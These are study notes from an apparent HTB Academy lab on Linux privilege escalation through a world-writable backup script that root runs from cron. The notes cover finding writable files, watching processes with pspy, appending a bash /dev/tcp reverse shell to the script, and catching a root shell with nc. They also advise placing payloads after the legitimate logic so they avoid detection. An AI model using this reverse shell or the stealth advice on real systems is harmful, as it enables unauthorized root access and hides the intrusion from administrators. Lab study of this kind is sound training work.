# Linux Privilege Escalation — Cron Job Abuse

**Module:** HTB Academy (Linux Privilege Escalation track)

---

## Cron Basics

- Cron jobs can run on a schedule, or one-time (e.g., on boot) — typically for admin tasks: backups, directory cleanup, etc.
- `crontab` creates a cron file, run by the cron daemon on schedule.
- User cron files live in **`/var/spool/cron`** (per-user).
- Six fields per crontab entry: **minute, hour, day, month, weekday, command**.
  - Example: `0 */12 * * * /home/admin/backup.sh` → runs every 12 hours.

### Attack Surface

- The **root crontab** itself is normally editable only by root/full-sudo users — but can still be abused **indirectly**:
  - A **world-writable script** that runs as root, even without knowing its exact schedule, can often be inferred (e.g., a backup script producing a `.tar.gz` every N hours).
  - Append a malicious command (e.g., reverse shell one-liner) to such a script → executes with root privileges on the next scheduled run.
- Some applications create cron files in **`/etc/cron.d`** — occasionally misconfigured to allow non-root edits.

## Step 1 — Find Writable Files Potentially Tied to Cron

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

```
/etc/cron.daily/backup
/dmz-backups/backup.sh
/home/backupsvc/backup.sh
```

- `backup.sh` in `/dmz-backups` stands out as a likely cron-driven script.

---

## Step 2 — Confirm the Misconfiguration

```bash
ls -la /dmz-backups/
```

```
drwxrwxrwx  2 root root  .
-rwxrwxrwx  1 root root  backup.sh
-rw-r--r--  1 root root  www-backup-...02:24:01.tgz
-rw-r--r--  1 root root  www-backup-...02:27:01.tgz
-rw-r--r--  1 root root  www-backup-...02:30:01.tgz
```

**Two findings:**
1. Backup files generated **every 3 minutes** — likely a sysadmin typo: intended `0 */3 * * *` (every 3 hours) but wrote `*/3 * * * *` (every 3 minutes).
2. `backup.sh` is **world-writable** (`-rwxrwxrwx`) and **runs as root**.

---

## Step 3 — Confirm the Cron Job is Actually Running — pspy

- **pspy**: command-line tool to view running processes **without root privileges**, by scanning procfs. Useful for observing cron jobs, other users' commands, etc.

```bash
./pspy64 -pf -i 1000
```

- `-pf` → print commands + filesystem events.
- `-i 1000` → scan procfs every 1000ms.

### Relevant Output

```
CMD: UID=0  PID=2201  | /bin/bash /dmz-backups/backup.sh
CMD: UID=0  PID=2199  | /usr/sbin/CRON -f
CMD: UID=0  PID=2204  | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-...tgz /var/www/html
CMD: UID=0  PID=2205  | gzip
```

- Confirms: cron (as root) → runs `backup.sh` → tars `/var/www/html` into `/dmz-backups`.

## Step 4 — Weaponize the Script

### Review Original Script

```bash
cat /dmz-backups/backup.sh
```

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

### Append a Reverse Shell

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

**Best practice:** always keep a backup copy of any script before editing it, and append new commands **after** the original functionality so the legitimate task still completes normally (reduces suspicion / avoids breaking things).

## Step 5 — Catch the Shell

```bash
nc -lnvp 443
```

```
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882

root@NIX02:~# id
uid=0(root) gid=0(root) groups=0(root)
```

- Within the ~3-minute cron interval, a **root shell** is received.

## Key Takeaways

- **Find writable files that run as root**: `find / -perm -o+w -type f 2>/dev/null` (excluding `/proc`) is the go-to first step.
- **pspy** is invaluable for confirming cron activity and timing **without needing root** — lets you observe what's actually executing and when.
- Even when the crontab itself is locked down, a **world-writable script invoked by that crontab** is an equally effective attack vector.
- A misconfigured schedule (e.g., `*/3 * * * *` instead of `0 */3 * * *`) can turn an infrequent task into a near-immediate privilege escalation opportunity.
- Always append malicious payloads **after** legitimate script logic to preserve normal operation and avoid detection.
- Not the most common vector, but still worth checking routinely — cron misconfigurations show up periodically in real engagements.
